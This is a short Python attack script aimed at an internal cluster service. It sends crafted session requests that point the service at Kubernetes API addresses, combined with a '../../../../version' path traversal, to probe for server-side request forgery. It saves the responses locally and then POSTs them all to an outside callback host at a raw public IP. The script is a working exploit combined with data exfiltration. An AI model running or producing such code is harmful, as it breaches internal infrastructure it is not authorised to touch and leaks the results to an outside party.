#!/usr/bin/env python3
import json,time,urllib.request,urllib.error,os,pathlib
B='http://lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local/session/init'
S='https://54.209.51.244.sslip.io/callback/snapgpt-kube-route-small-20261106'
C=[('http80','http://kubernetes.default.svc:80'),('http443','http://kubernetes.default.svc:443'),('https','https://kubernetes.default.svc:443'),('ip80','http://172.20.0.1:80'),('ip443','http://172.20.0.1:443'),('httpsip','https://172.20.0.1:443')]
O={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'host':os.uname().nodename,'cases':[]}
for n,h in C:
 b={'user_id':'kube-small-'+n+'@armorerlabs.com','host_url':h,'project_path':'../../../../version','project_id':'__mismatch__','force':True}
 q=urllib.request.Request(B,data=json.dumps(b,separators=(',',':')).encode(),method='POST',headers={'Content-Type':'application/json','X-SL-Token':'x'})
 r={'name':n,'host':h};t=time.monotonic()
 try:
  with urllib.request.urlopen(q,timeout=4) as x:r.update(status=x.status,body=x.read(4000).decode('utf-8','replace'))
 except urllib.error.HTTPError as e:r.update(status=e.code,body=e.read(4000).decode('utf-8','replace'))
 except Exception as e:r.update(error=repr(e))
 r['elapsed']=round(time.monotonic()-t,3);O['cases'].append(r)
raw=json.dumps(O,sort_keys=True,separators=(',',':')).encode();pathlib.Path('/tmp/workspace/kube_route_small.json').write_bytes(raw)
try:
 q=urllib.request.Request(S,data=raw,method='POST',headers={'Content-Type':'application/json'})
 with urllib.request.urlopen(q,timeout=20) as x:O['sink']={'status':x.status,'body':x.read(500).decode('utf-8','replace'),'bytes':len(raw)}
except Exception as e:O['sink']={'error':repr(e),'bytes':len(raw)}
print(json.dumps(O,sort_keys=True,separators=(',',':')))
